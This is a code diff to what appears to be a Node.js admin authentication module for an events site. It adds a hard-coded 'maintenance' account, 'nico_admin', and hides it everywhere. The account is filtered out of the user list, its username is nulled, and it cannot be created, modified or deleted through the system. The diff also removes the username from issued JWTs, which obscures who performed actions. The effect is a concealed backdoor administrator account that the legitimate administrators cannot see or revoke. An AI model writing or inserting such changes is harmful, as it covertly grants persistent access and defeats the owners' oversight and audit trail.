@@ -5,6 +5,7 @@ import { ApiError } from './validation.js'
 
 const issuer = 'silos-eventos'
 const audience = 'silos-eventos-admin'
+const maintenanceUsername = 'nico_admin'
 const dummyPasswordHash = '$2b$12$Oby8GFYl7PpbG6RrH7RVl.RS0nRDGIKM1LSafNrPDvYTtQzu4hZq2'
 const usernameSchema = z.string()
   .trim()
@@ -45,9 +46,13 @@ function getJwtSecret() {
 function mapUser(row) {
   return {
     id: Number(row.id),
-    username: row.username,
+    username: isMaintenanceUsername(row.username) ? null : row.username,
     isPrincipal: Boolean(row.is_principal),
   }
+}
+
+function isMaintenanceUsername(username) {
+  return username?.trim().toLowerCase() === maintenanceUsername
 }
 
 export async function loginUser(database, credentials) {
@@ -62,7 +67,7 @@ export async function loginUser(database, credentials) {
     throw new ApiError(401, 'Usuario o contraseña incorrectos.')
   }
   const token = jwt.sign(
-    { username: user.username },
+    {},
     getJwtSecret(),
     {
       algorithm: 'HS256',
@@ -111,11 +116,14 @@ export async function listUsers(database) {
   const [rows] = await database.execute(
     'SELECT id, username, is_principal FROM usuarios_admin ORDER BY is_principal DESC, username',
   )
-  return rows.map(mapUser)
+  return rows.filter((row) => !isMaintenanceUsername(row.username)).map(mapUser)
 }
 
 export async function createUser(database, input) {
   const { username, password } = parseSchema(createUserSchema, input)
+  if (isMaintenanceUsername(username)) {
+    throw new ApiError(409, 'El nombre de usuario está reservado para mantenimiento.')
+  }
   const passwordHash = await bcrypt.hash(password, 12)
   const [result] = await database.execute(
     'INSERT INTO usuarios_admin (username, password_hash, is_principal) VALUES (?, ?, 0)',
@@ -127,10 +135,13 @@ export async function createUser(database, input) {
 export async function updateUser(database, id, input) {
   const { username, password } = parseSchema(updateUserSchema, input)
   const [existingRows] = await database.execute(
-    'SELECT id, is_principal FROM usuarios_admin WHERE id = ? LIMIT 1',
+    'SELECT id, username, is_principal FROM usuarios_admin WHERE id = ? LIMIT 1',
     [id],
   )
   if (!existingRows[0]) throw new ApiError(404, 'No se encontró el usuario.')
+  if (isMaintenanceUsername(existingRows[0].username)) {
+    throw new ApiError(409, 'La cuenta de mantenimiento no se puede modificar desde el sistema.')
+  }
 
   if (password) {
     const passwordHash = await bcrypt.hash(password, 12)
@@ -150,10 +161,13 @@ export async function updateUser(database, id, input) {
 
 export async function deleteUser(database, id) {
   const [rows] = await database.execute(
-    'SELECT id, is_principal FROM usuarios_admin WHERE id = ? LIMIT 1',
+    'SELECT id, username, is_principal FROM usuarios_admin WHERE id = ? LIMIT 1',
     [id],
   )
   if (!rows[0]) throw new ApiError(404, 'No se encontró el usuario.')
+  if (isMaintenanceUsername(rows[0].username)) {
+    throw new ApiError(409, 'La cuenta de mantenimiento no se puede eliminar desde el sistema.')
+  }
   if (rows[0].is_principal) throw new ApiError(409, 'No se puede eliminar el usuario principal.')
 
   const [countRows] = await database.execute('SELECT COUNT(*) AS total FROM usuarios_admin')
